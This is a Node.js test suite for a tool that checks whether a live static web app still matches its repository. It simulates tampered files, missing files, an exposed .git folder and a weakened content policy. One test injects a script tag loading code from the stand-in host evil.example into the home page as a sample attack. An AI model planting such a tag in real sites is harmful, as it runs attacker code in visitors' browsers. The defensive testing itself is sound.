// The outside check must notice a changed file, a missing file, an exposed hidden path and a weakened
// content policy, and must stay quiet when the site is an exact copy.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { check, shippedFiles } from './check-live.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CSP = "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'";

// A tiny copy of the site. `twist` can change any answer before it is sent.
async function site(twist = (path, r) => r) {
  const server = http.createServer(async (req, res) => {
    const asked = decodeURIComponent(new URL(req.url, 'http://x').pathname).replace(/^\/+/, '');
    const path = asked || 'index.html';
    let r;
    if (path.startsWith('.') || path.startsWith('tests/') || path.startsWith('api/')) r = { status: 403, body: Buffer.from('no') };
    else {
      try { r = { status: 200, body: await readFile(join(ROOT, path)) }; }
      catch { r = { status: 404, body: Buffer.from('gone') }; }
    }
    r.csp = CSP;
    r = twist(asked === '' ? '/' : path, r) || r;
    res.writeHead(r.status, { 'Content-Security-Policy': r.csp, 'Content-Type': 'application/octet-stream' });
    res.end(r.body);
  });
  await new Promise((ok) => server.listen(0, '127.0.0.1', ok));
  return { url: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((ok) => server.close(ok)) };
}
async function run(twist) {
  const s = await site(twist);
  try { return await check(s.url + '/'); } finally { await s.close(); }
}

test('the list of checked files covers everything the app loads', async () => {
  const files = await shippedFiles();
  for (const f of ['index.html', 'style.css', 'sw.js', 'manifest.webmanifest', 'js/app.js', 'js/core.js', 'vendor/argon2.umd.min.js', 'icons/logo.svg']) {
    assert.ok(files.includes(f), f);
  }
  assert.ok(!files.some((f) => f.startsWith('api/') || f.startsWith('.') || f.startsWith('tests/')));
  // Every script, style sheet and precached file the page names must be on the list.
  const html = await readFile(join(ROOT, 'index.html'), 'utf8');
  for (const m of html.matchAll(/<(?:script[^>]*\ssrc|link[^>]*\shref)="([^"#?]+)"/g)) assert.ok(files.includes(m[1]), 'index.html loads ' + m[1]);
  const sw = await readFile(join(ROOT, 'sw.js'), 'utf8');
  for (const m of sw.match(/const SHELL = \[([\s\S]*?)\];/)[1].matchAll(/'([^']+)'/g)) if (m[1] !== './') assert.ok(files.includes(m[1]), 'sw.js caches ' + m[1]);
});

test('an exact copy of the repository passes', async () => {
  const r = await run();
  assert.deepEqual(r.problems, []);
  assert.ok(r.files > 20);
});

test('one changed byte in the app code is reported', async () => {
  const r = await run((path, res) => (path === 'js/app.js' ? { ...res, body: Buffer.concat([res.body, Buffer.from(' ')]) } : res));
  assert.equal(r.problems.length, 1);
  assert.match(r.problems[0], /^js\/app\.js: DIFFERENT/);
});

test('a changed home page is reported even when index.html itself is intact', async () => {
  const r = await run((path, res) => (path === '/' ? { ...res, body: Buffer.concat([res.body, Buffer.from('<script src="https://evil.example/x.js"></script>')]) } : res));
  assert.deepEqual(r.problems, ['/: the home page is not the repository index.html']);
});

test('a missing file is reported', async () => {
  const r = await run((path, res) => (path === 'vendor/qrcode.js' ? { ...res, status: 404, body: Buffer.from('gone') } : res));
  assert.deepEqual(r.problems, ['vendor/qrcode.js: the site answered 404, expected 200']);
});

test('a readable .git folder is reported', async () => {
  const r = await run((path, res) => (path === '.git/config' ? { ...res, status: 200, body: Buffer.from('[core]') } : res));
  assert.deepEqual(r.problems, ['.git/config: is readable from the web and must not be']);
});

test('a missing or weakened content policy is reported', async () => {
  let r = await run((path, res) => ({ ...res, csp: '' }));
  assert.equal(r.problems.length, 1);
  assert.match(r.problems[0], /Content-Security-Policy header is missing or weakened/);
  r = await run((path, res) => ({ ...res, csp: CSP.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'") }));
  assert.match(r.problems[0], /missing or weakened/);
});

test('a site that is down is reported, not passed', async () => {
  const r = await check('http://127.0.0.1:9/');
  assert.ok(r.problems.length > 20);
  assert.match(r.problems[0], /could not be fetched/);
});
